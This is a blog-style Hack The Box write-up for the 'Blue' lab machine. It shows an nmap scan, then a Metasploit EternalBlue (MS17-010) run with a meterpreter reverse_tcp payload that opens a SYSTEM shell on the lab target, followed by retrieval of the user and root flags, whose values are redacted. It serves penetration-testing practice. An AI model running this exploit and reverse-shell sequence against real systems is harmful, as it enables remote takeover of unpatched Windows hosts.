@@ -1,0 +1,535 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1.0, user-scalable=no">
+
+    
+      <link rel="icon" href="/favicon.png" />
+    
+
+    <title>
+        
+          Hack The Box - blue - DiegoExploit
+        
+    </title>
+    <style>
+  #carbonads {
+    border: 1px solid black;
+    border-radius: 7px;
+    border-spacing: 7px;
+    display: block;
+    overflow: hidden;
+    padding: 1em;
+    line-height: 1.5;
+  }
+  #carbonads span {
+    position: relative;
+    display: block;
+    overflow: hidden;
+  }
+  .carbon-img {
+    float: left;
+    margin-right: 1em;
+  }
+  .carbon-img img {
+    display: block;
+  }
+  .carbon-text {
+    display: block;
+    float: left;
+    max-width: calc(100% - 130px - 1em);
+    text-align: left;
+  }
+  .carbon-poweredby {
+    position: absolute;
+    left: 142px;
+    bottom: 0;
+    display: block;
+    font-size: .8em;
+    line-height: 1;
+    letter-spacing: 1px;
+    }
+    </style>
+    <!-- Spectre.css framework -->
+    <link rel="stylesheet" href="https://unpkg.com/spectre.css/dist/spectre.min.css">
+    <link rel="stylesheet" href="https://unpkg.com/spectre.css/dist/spectre-exp.min.css">
+    <link rel="stylesheet" href="https://unpkg.com/spectre.css/dist/spectre-icons.min.css">
+
+    <!-- theme css & js -->
+    
+<link rel="stylesheet" href="/css/book.css">
+
+    
+<script src="/js/book.js"></script>
+
+
+    <!-- tocbot -->
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/tocbot/4.4.2/tocbot.min.js"></script>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/tocbot/4.4.2/tocbot.css">
+    
+    <!-- katex -->
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.10.0/katex.min.css">
+
+    
+<!-- Google Tag Manager -->
+<script>(function(w,d,s,l,i){w[l]=w[l]||[];w[l].push({'gtm.start':
+new Date().getTime(),event:'gtm.js'});var f=d.getElementsByTagName(s)[0],
+j=d.createElement(s),dl=l!='dataLayer'?'&l='+l:'';j.async=true;j.src=
+'https://www.googletagmanager.com/gtm.js?id='+i+dl;f.parentNode.insertBefore(j,f);
+})(window,document,'script','dataLayer','GTM-P385GSF');</script>
+<!-- End Google Tag Manager -->
+<!-- Google Tag Manager (noscript) -->
+<noscript><iframe src="https://www.googletagmanager.com/ns.html?id=GTM-P385GSF"
+height="0" width="0" style="display:none;visibility:hidden"></iframe></noscript>
+<!-- End Google Tag Manager (noscript) -->
+
+    
+<script src="https://cdnjs.cloudflare.com/ajax/libs/zooming/2.1.1/zooming.min.js"></script>
+<script>
+document.addEventListener('DOMContentLoaded', function () {
+    const zooming = new Zooming()
+    zooming.listen('.book-content img')
+})
+</script>
+
+    <style>
+      #htbbadge{
+        float: left;
+      }
+    </style>
+<meta name="generator" content="Hexo 4.2.0"><link rel="alternate" href="/feed.xml" title="DiegoExploit" type="application/rss+xml">
+</head>
+
+<body>
+
+<div class="book-container">
+  <div class="book-sidebar">
+    <div class="book-brand">
+  <a href="/">
+    <img src="/favicon.png">
+    <span>DiegoExploit</span>
+  </a>
+</div>
+    <div class="book-menu">
+  <ul>
+<li><a href="/">Home</a></li>
+</ul>
+<h1 id="Categories Windows"><a href="#Categories Windows" class="headerlink" title="Categories Windows"></a>Categories Windows</h1><h2 id="Hack-The-Box-"><a href="#Hack-The-Box-" class="headerlink" title="Hack The Box"></a>Hack The Box </h2><ul>
+
+<li><a href="/hack-the-box/legacy/">1. Hack The Box - Legacy</a></li>
+<li><a href="/hack-the-box/devel/">2. Hack The Box - Devel</a></li>
+<li><a href="/hack-the-box/optimum/">3. Hack The Box - Optimum</a></li>
+<li><a href="/hack-the-box/bastard/">4. Hack The Box - Bastard</a></li>
+<li><a href="/hack-the-box/artic/">5. Hack The Box - Artic</a></li>
+<li><a href="/hack-the-box/grandpa/">6. Hack The Box - Grandpa</a></li>
+<li><a href="/hack-the-box/granny/">7. Hack The Box - Granny</a></li>
+<li><a href="/hack-the-box/blue/">8. Hack The Box - Blue</a></li>
+<li><a href="/hack-the-box/silo/">9. Hack The Box - Silo</a></li>
+<li><a href="/hack-the-box/bounty/">10. Hack The Box - Bounty</a></li>
+<li><a href="/hack-the-box/jerry/">11. Hack The Box - Jerry</a></li>
+<li><a href="/hack-the-box/conceal/">12. Hack The Box - Conceal</a></li>
+<li><a href="/hack-the-box/chatterbox/">13. Hack The Box - Chatterbox</a></li>
+<li><a href="/hack-the-box/forest/">14. Hack The Box - Forest</a></li>
+<li><a href="/hack-the-box/bankrobber/">15. Hack The Box - BkRobber</a></li>
+<li><a href="/hack-the-box/secnotes/">16. Hack The Box - Secnotes</a></li>
+<li><a href="/hack-the-box/bastion/">17. Hack The Box - Bastion</a></li>
+
+
+</ul>
+<h1 id="Categories Linux"><a href="#Categories Linux" class="headerlink" title="Categories Linux"></a>Categories Linux</h1><h2 id="Hack-The-Box-"><a href="#Hack-The-Box-" class="headerlink" title="Hack The Box"></a>Hack The Box </h2><ul>
+<li><a href="/hack-the-box/lame/">1. Hack The Box - Lame</a></li>
+<li><a href="/hack-the-box/popcorn/">2. Hack The Box - Popcorn</a></li>
+<li><a href="/hack-the-box/beep/">3. Hack The Box - Beep</a></li>
+<li><a href="/hack-the-box/tenten/">4. Hack The Box - Tenten</a></li>
+<li><a href="/hack-the-box/cronos/">5. Hack The Box - Cronos</a></li>
+<li><a href="/hack-the-box/brainfuck/">6. Hack The Box - brainfuck</a></li>
+<li><a href="/hack-the-box/shocker/">6. Hack The Box - Shocker</a></li>
+<li><a href="/hack-the-box/bashed/">7. Hack The Box - Bashed</a></li>
+<li><a href="/hack-the-box/nibbles/">8. Hack The Box - Nibbles</a></li>
+<li><a href="/hack-the-box/nineveh/">9. Hack The Box - Nineveh</a></li>
+<li><a href="/hack-the-box/sense/">10. Hack The Box - Sense</a></li>
+<li><a href="/hack-the-box/solidstate/">11. Hack The Box - SolidState</a></li>
+<li><a href="/hack-the-box/kotarak/">12. Hack The Box - Kotarak</a></li>
+<li><a href="/hack-the-box/node/">13. Hack The Box - Node</a></li>
+<li><a href="/hack-the-box/valentine/">14. Hack The Box - Valentine</a></li>
+<li><a href="/hack-the-box/poison/">15. Hack The Box - Poison</a></li>
+<li><a href="/hack-the-box/sunday/">16. Hack The Box - Sunday</a></li>
+<li><a href="/hack-the-box/tartasauce/">17. Hack The Box - Tartasauce</a></li>
+<li><a href="/hack-the-box/friendzone/">18. Hack The Box - Friendzone</a></li>
+<li><a href="/hack-the-box/swagshop/">19. HTB- SwagShop</a></li>
+<li><a href="/hack-the-box/jarvis/">20. Hack The Box Jarvis</a></li>
+</ul>
+
+
+
+</div>
+
+
+<script src="/js/book-menu.js"></script>
+
+  </div>
+
+  <div class="off-canvas-content">
+    <div class="columns">
+      <div class="column col-10 col-lg-12">
+        <div class="book-navbar">
+          <!-- For Responsive Layout -->
+
+<header class="navbar">
+  <section class="navbar-section">
+    <a onclick="open_sidebar()">
+      <i class="icon icon-menu"></i>
+    </a>
+  </section>
+</header>
+
+        </div>
+        <div class="book-content">
+          <div class="book-post">
+  <br>
+  <h1 id="Hack-The-Box-Blue"><a href="#Hack-The-Box-Blue" class="headerlink" title="Hack The Box - Blue"></a>Hack The Box - Blue</h1><h2 id="Quick-Summary"><a href="#Quick-Summary" class="headerlink" title="Quick Summary"></a>Quick Summary</h2><p>Blue, while possibly the most simple machine on Hack The Box, demonstrates the severity of the EternalBlue exploit, which has been used in multiple large-scale ransomware and crypto-mining attacks since it was leaked publicly. Its IP address is <code>10.10.10.40</code> Let’s go to hack!!!<br><img src="/images/hackthebox/exploit/blue/0.png" alt=""></p>
+<h2 id="Nmap"><a href="#Nmap" class="headerlink" title="Nmap"></a>Nmap</h2>
+<p>As always we will start with <code>nmap</code> to scan for open ports and services:
+
+<pre><figure class="highlight plain"> |-------(root@kali)-------|(~/HackTheBox/blue)
+ |
+ |-->{SFire129}#nmap -A -v  10.10.10.40
+ Increasing send delay for 10.10.10.40 from 0 to 5 due to 276 out of 919 dropped probes since last increase.
+ Nmap scan report for 10.10.10.40
+ Host is up (0.097s latency).
+ Not shown: 991 closed ports
+ PORT      STATE SERVICE      VERSION
+ 135/tcp   open  msrpc        Microsoft Windows RPC
+ 139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
+ 445/tcp   open  microsoft-ds Windows 7 Professional 7601 Service Pack 1 microsoft-ds (workgroup: WORKGROUP)
+ 49152/tcp open  msrpc        Microsoft Windows RPC
+ 49153/tcp open  msrpc        Microsoft Windows RPC
+ 49154/tcp open  msrpc        Microsoft Windows RPC
+ 49155/tcp open  msrpc        Microsoft Windows RPC
+ 49156/tcp open  msrpc        Microsoft Windows RPC
+ 49157/tcp open  msrpc        Microsoft Windows RPC
+ No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
+ TCP/IP fingerprint:
+ OS:SCAN(V=7.80%E=4%D=5/26%OT=135%CT=1%CU=38821%PV=Y%DS=2%DC=T%G=Y%TM=5ECD2A
+ OS:D2%P=x86_64-pc-linux-gnu)SEQ(SP=FD%GCD=1%ISR=109%TI=I%CI=I%II=I%SS=S%TS=
+ OS:7)OPS(O1=M54DNW8ST11%O2=M54DNW8ST11%O3=M54DNW8NNT11%O4=M54DNW8ST11%O5=M5
+ OS:4DNW8ST11%O6=M54DST11)WIN(W1=2000%W2=2000%W3=2000%W4=2000%W5=2000%W6=200
+ OS:0)ECN(R=Y%DF=Y%T=80%W=2000%O=M54DNW8NNS%CC=N%Q=)T1(R=Y%DF=Y%T=80%S=O%A=S
+ OS:+%F=AS%RD=0%Q=)T2(R=Y%DF=Y%T=80%W=0%S=Z%A=S%F=AR%O=%RD=0%Q=)T3(R=Y%DF=Y%
+ OS:T=80%W=0%S=Z%A=O%F=AR%O=%RD=0%Q=)T4(R=Y%DF=Y%T=80%W=0%S=A%A=O%F=R%O=%RD=
+ OS:0%Q=)T5(R=Y%DF=Y%T=80%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=80%W=0%
+ OS:S=A%A=O%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=80%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(
+ OS:R=Y%DF=N%T=80%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=
+ OS:N%T=80%CD=Z)
+ 
+ Uptime guess: 0.071 days (since Tue May 26 09:00:41 2020)
+ Network Distance: 2 hops
+ TCP Sequence Prediction: Difficulty=253 (Good luck!)
+ IP ID Sequence Generation: Incremental
+ Service Info: Host: HARIS-PC; OS: Windows; CPE: cpe:/o:microsoft:windows
+ 
+ Host script results:
+ |_clock-skew: mean: -15m58s, deviation: 34m36s, median: 4m00s
+ | smb-os-discovery:
+ |   OS: Windows 7 Professional 7601 Service Pack 1 (Windows 7 Professional 6.1)
+ |   OS CPE: cpe:/o:microsoft:windows_7::sp1:professional
+ |   Computer name: haris-PC
+ |   NetBIOS computer name: HARIS-PC\x00
+ |   Workgroup: WORKGROUP\x00
+ |_  System time: 2020-05-26T15:46:19+01:00
+ | smb-security-mode:
+ |   account_used: guest
+ |   authentication_level: user
+ |   challenge_response: supported
+ |_  message_signing: disabled (dangerous, but default)
+ | smb2-security-mode:
+ |   2.02:
+ |_    Message signing enabled but not required
+ | smb2-time:
+ |   date: 2020-05-26T14:46:17
+ |_  start_date: 2020-05-26T13:05:09
+ 
+ TRACEROUTE (using port 80/tcp)
+ HOP RTT      ADDRESS
+ 1   97.15 ms 10.10.14.1
+ 2   97.41 ms 10.10.10.40
+ 
+ Read data files from: /usr/bin/../share/nmap
+ OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+ # Nmap done at Tue May 26 10:42:26 2020 -- 1 IP address (1 host up) scanned in 91.89 seconds<br></figure></pre>
+<p> The server run service on port 445, which is vulnerable to <code>ms17-010 Eternalblue</code>
+<<img src="/images/hackthebox/exploit/blue/1.png" alt=""></p>
+<h2 id="Exploit"><a href="#Exploit" class="Exploit" title="Exploit"></a>Exploit</h2>
+<p>Run the Metasploit, search <code>Eternalblue</code> exploit, configure and run it.
+<pre><figure class="highlight plain"> |-------(root@kali)-------|(~/HackTheBox/blue)
+ |
+ |-->{SFire129}#msfconsole
+ 
+ Call trans opt: received. 2-19-98 13:24:18 REC:Loc
+ 
+      Trace program: running
+ 
+            wake up, Neo...
+         the matrix has you
+       follow the white rabbit.
+ 
+           knock, knock, Neo.
+ 
+                         (`.         ,-,
+                         ` `.    ,;' /
+                          `.  ,'/ .'
+                           `. X /.'
+                 .-;--''--.._` ` (
+               .'            /   `
+              ,           ` '   Q '
+              ,         ,   `._    \
+           ,.|         '     `-.;_'
+           :  . `  ;    `  ` --,.._;
+            ' `    ,   )   .'
+               `._ ,  '   /_
+                  ; ,''-,;' ``-
+                   ``-..__``--`
+ 
+                              https://metasploit.com
+ 
+ 
+        =[ metasploit v5.0.89-dev-                         ]
+ + -- --=[ 2017 exploits - 1099 auxiliary - 343 post       ]
+ + -- --=[ 566 payloads - 45 encoders - 10 nops            ]
+ + -- --=[ 7 evasion                                       ]
+ 
+ Metasploit tip: Use sessions -1 to interact with the last opened session
+ 
+ msf5 > search eternalblue
+ 
+ Matching Modules
+ ================
+ 
+    #  Name                                           Disclosure Date  Rank     Check  Description
+    -  ----                                           ---------------  ----     -----  -----------
+    0  auxiliary/admin/smb/ms17_010_command           2017-03-14       normal   No     MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Command Execution
+    1  auxiliary/scanner/smb/smb_ms17_010                              normal   No     MS17-010 SMB RCE Detection
+    2  exploit/windows/smb/ms17_010_eternalblue       2017-03-14       average  Yes    MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption
+    3  exploit/windows/smb/ms17_010_eternalblue_win8  2017-03-14       average  No     MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption for Win8+
+    4  exploit/windows/smb/ms17_010_psexec            2017-03-14       normal   Yes    MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Code Execution
+    5  exploit/windows/smb/smb_doublepulsar_rce       2017-04-14       great    Yes    SMB DOUBLEPULSAR Remote Code Execution
+ 
+ 
+ msf5 > use exploit/windows/smb/ms17_010_eternalblue
+ msf5 exploit(windows/smb/ms17_010_eternalblue) > set payload windows/x64/meterpreter/reverse_tcp
+ payload => windows/x64/meterpreter/reverse_tcp
+ msf5 exploit(windows/smb/ms17_010_eternalblue) > set LHOST tun0
+ LHOST => tun0
+ msf5 exploit(windows/smb/ms17_010_eternalblue) > set RHOST 10.10.10.40
+ RHOST => 10.10.10.40
+ msf5 exploit(windows/smb/ms17_010_eternalblue) > show options
+ 
+ Module options (exploit/windows/smb/ms17_010_eternalblue):
+ 
+    Name           Current Setting  Required  Description
+    ----           ---------------  --------  -----------
+    RHOSTS         10.10.10.40      yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
+    RPORT          445              yes       The target port (TCP)
+    SMBDomain      .                no        (Optional) The Windows domain to use for authentication
+    SMBPass                         no        (Optional) The password for the specified username
+    SMBUser                         no        (Optional) The username to authenticate as
+    VERIFY_ARCH    true             yes       Check if remote architecture matches exploit Target.
+    VERIFY_TARGET  true             yes       Check if remote OS matches exploit Target.
+ 
+ 
+ Payload options (windows/x64/meterpreter/reverse_tcp):
+ 
+    Name      Current Setting  Required  Description
+    ----      ---------------  --------  -----------
+    EXITFUNC  thread           yes       Exit technique (Accepted: '', seh, thread, process, none)
+    LHOST     tun0             yes       The listen address (an interface may be specified)
+    LPORT     4444             yes       The listen port
+ 
+ 
+ Exploit target:
+ 
+    Id  Name
+    --  ----
+    0   Windows 7 and Server 2008 R2 (x64) All Service Packs
+ 
+ 
+ msf5 exploit(windows/smb/ms17_010_eternalblue) > run
+ 
+ [*] Started reverse TCP handler on 10.10.14.27:4444
+ [*] 10.10.10.40:445 - Using auxiliary/scanner/smb/smb_ms17_010 as check
+ [+] 10.10.10.40:445       - Host is likely VULNERABLE to MS17-010! - Windows 7 Professional 7601 Service Pack 1 x64 (64-bit)
+ [*] 10.10.10.40:445       - Scanned 1 of 1 hosts (100% complete)
+ [*] 10.10.10.40:445 - Connecting to target for exploitation.
+ [+] 10.10.10.40:445 - Connection established for exploitation.
+ [+] 10.10.10.40:445 - Target OS selected valid for OS indicated by SMB reply
+ [*] 10.10.10.40:445 - CORE raw buffer dump (42 bytes)
+ [*] 10.10.10.40:445 - 0x00000000  57 69 6e 64 6f 77 73 20 37 20 50 72 6f 66 65 73  Windows 7 Profes
+ [*] 10.10.10.40:445 - 0x00000010  73 69 6f 6e 61 6c 20 37 36 30 31 20 53 65 72 76  sional 7601 Serv
+ [*] 10.10.10.40:445 - 0x00000020  69 63 65 20 50 61 63 6b 20 31                    ice Pack 1
+ [+] 10.10.10.40:445 - Target arch selected valid for arch indicated by DCE/RPC reply
+ [*] 10.10.10.40:445 - Trying exploit with 12 Groom Allocations.
+ [*] 10.10.10.40:445 - Sending all but last fragment of exploit packet
+ [*] 10.10.10.40:445 - Starting non-paged pool grooming
+ [+] 10.10.10.40:445 - Sending SMBv2 buffers
+ [+] 10.10.10.40:445 - Closing SMBv1 connection creating free hole adjacent to SMBv2 buffer.
+ [*] 10.10.10.40:445 - Sending final SMBv2 buffers.
+ [*] 10.10.10.40:445 - Sending last fragment of exploit packet!
+ [*] 10.10.10.40:445 - Receiving response from exploit packet
+ [+] 10.10.10.40:445 - ETERNALBLUE overwrite completed successfully (0xC000000D)!
+ [*] 10.10.10.40:445 - Sending egg to corrupted connection.
+ [*] 10.10.10.40:445 - Triggering free of corrupted buffer.
+ 
+ [-] 10.10.10.40:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
+ [-] 10.10.10.40:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=FAIL-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
+ [-] 10.10.10.40:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
+ [*] 10.10.10.40:445 - Connecting to target for exploitation.
+ [+] 10.10.10.40:445 - Connection established for exploitation.
+ [+] 10.10.10.40:445 - Target OS selected valid for OS indicated by SMB reply
+ [*] 10.10.10.40:445 - CORE raw buffer dump (42 bytes)
+ [*] 10.10.10.40:445 - 0x00000000  57 69 6e 64 6f 77 73 20 37 20 50 72 6f 66 65 73  Windows 7 Profes
+ [*] 10.10.10.40:445 - 0x00000010  73 69 6f 6e 61 6c 20 37 36 30 31 20 53 65 72 76  sional 7601 Serv
+ [*] 10.10.10.40:445 - 0x00000020  69 63 65 20 50 61 63 6b 20 31                    ice Pack 1
+ [+] 10.10.10.40:445 - Target arch selected valid for arch indicated by DCE/RPC reply
+ [*] 10.10.10.40:445 - Trying exploit with 17 Groom Allocations.
+ [*] 10.10.10.40:445 - Sending all but last fragment of exploit packet
+ [*] 10.10.10.40:445 - Starting non-paged pool grooming
+ [+] 10.10.10.40:445 - Sending SMBv2 buffers
+ [+] 10.10.10.40:445 - Closing SMBv1 connection creating free hole adjacent to SMBv2 buffer.
+ [*] 10.10.10.40:445 - Sending final SMBv2 buffers.
+ [*] 10.10.10.40:445 - Sending last fragment of exploit packet!
+ [*] 10.10.10.40:445 - Receiving response from exploit packet
+ [+] 10.10.10.40:445 - ETERNALBLUE overwrite completed successfully (0xC000000D)!
+ [*] 10.10.10.40:445 - Sending egg to corrupted connection.
+ [*] 10.10.10.40:445 - Triggering free of corrupted buffer.
+ [*] Sending stage (201283 bytes) to 10.10.10.40
+ [*] Meterpreter session 1 opened (10.10.14.27:4444 -> 10.10.10.40:49159) at 2020-05-26 13:49:55 -0400
+ [+] 10.10.10.40:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
+ [+] 10.10.10.40:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-WIN-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
+ [+] 10.10.10.40:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
+ 
+ meterpreter >
+ meterpreter > shell
+ Process 1700 created.
+ Channel 1 created.
+ Microsoft Windows [Version 6.1.7601]
+ Copyright (c) 2009 Microsoft Corporation.  All rights reserved.
+ 
+ C:\Windows\system32>whoami
+ whoami
+ nt authority\system
+  C:\Windows\system32></figure></pre>
+<h2 id="Capture-The-Flag"><a href="#Capture-The-Flag" class="Capture-The-Flag" title="Capture-The-Flag"></a>Capture The Flag</h2>
+<pre><figure class="highlight plain"> C:\Windows\system32>cd ..
+ C:\Windows>cd ..
+ C:\>cd Users
+ C:\Users>dir
+ dir
+  Volume in drive C has no label.
+  Volume Serial Number is A0EF-1911
+ 
+  Directory of C:\Users
+ 
+ 21/07/2017  07:56    DIR          .
+ 21/07/2017  07:56    DIR          ..
+ 21/07/2017  07:56    DIR          Administrator
+ 14/07/2017  14:45    DIR          haris
+ 12/04/2011  08:51    DIR          Public
+                0 File(s)              0 bytes
+                5 Dir(s)  15,465,017,344 bytes free
+ 
+ C:\Users>cd haris
+ C:\Users\haris>cd Desktop
+ C:\Users\haris\Desktop>type user.txt
+ type user.txt
+ ***Here you could be finde the user flag***
+ C:\Users\haris\Desktop>cd ..
+ C:\Users\haris>cd ..
+ C:\Users>cd Administrator
+ C:\Users\Administrator>cd Desktop
+ C:\Users\Administrator\Desktop>type root.txt
+ type root.txt
+ ***Here you could be find the root flag***
+ C:\Users\Administrator\Desktop></figure></pre>
+
+<p> And we owned root !</p>
+</div>
+
+
+  <div class="book-comments">
+    
+
+
+
+
+  </div>
+
+
+
+<script src="/js/book-post.js"></script>
+
+        </div>
+      </div>
+      <div class="column col-2 hide-lg">
+        <div class="book-post-info">
+  
+    <div class="book-post-meta">
+
+  <div class="author">
+
+    <!-- Author image -->
+    <div class="author-img">
+      
+        <figure class="avatar avatar-lg">
+          <img src="/avatar.png" alt="...">
+        </figure>
+      
+    </div>
+
+    <!-- Author title -->
+    <div class="author-title">
+      <div>DiegoExploit</div>
+      <div>2020-05-26</div>
+    </div>
+  </div>
+
+  
+    <div class="divider"></div>
+
+    <div class="link">
+      <a class="category-link" href="/categories/hack-the-box/">hack-the-box</a>
+
+      <a class="tag-link" href="/tags/linux/" rel="tag">#windows</a> <a class="tag-link" href="/tags/sqli/" rel="tag">#Exploit</a> <a class="tag-link" href="/tags/ssh/" rel="tag">#EternalBlue</a>
+    </div>
+    
+  
+
+  <div class="divider"></div>
+</div>
+  
+
+  <div class="book-tocbot">
+</div>
+<div class="book-tocbot-menu">
+  <a class="book-toc-expand" onclick="expand_toc()">Expand all</a>
+  <a onclick="go_top()">Back to top</a>
+  <a onclick="go_bottom()">Go to bottom</a>
+</div>
+
+
+<script src="/js/book-toc.js"></script>
+
+</div>
+      </div>
+    </div>
+  </div>
+  
+  <a class="off-canvas-overlay" onclick="hide_canvas()"></a>
+</div>
+
+</body>
+</html>
+
+
+<script src="/js/book.js"></script>
